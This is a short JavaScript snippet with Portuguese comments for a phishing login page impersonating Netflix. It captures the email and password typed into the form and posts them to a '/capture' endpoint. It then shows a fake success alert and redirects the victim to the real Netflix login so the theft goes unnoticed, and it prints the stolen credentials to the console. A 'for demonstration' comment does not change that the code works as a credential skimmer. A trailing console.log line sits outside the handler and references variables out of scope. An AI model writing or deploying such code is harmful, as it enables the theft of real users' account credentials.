document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  fetch('/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: email, password: password })
  })
  .then(() => {
    alert("Login bem-sucedido! Redirecionando...");
    window.location.href = "https://www.netflix.com/login";
  });

  // Enviar para console (opcional, para demonstração)
  console.log(`Credenciais capturadas: Email: ${email}, Senha: ${password}`);
});

  console.log("Credenciais:", email, password); // ISSO DEIXA VISÍVEL NO CONSOLE
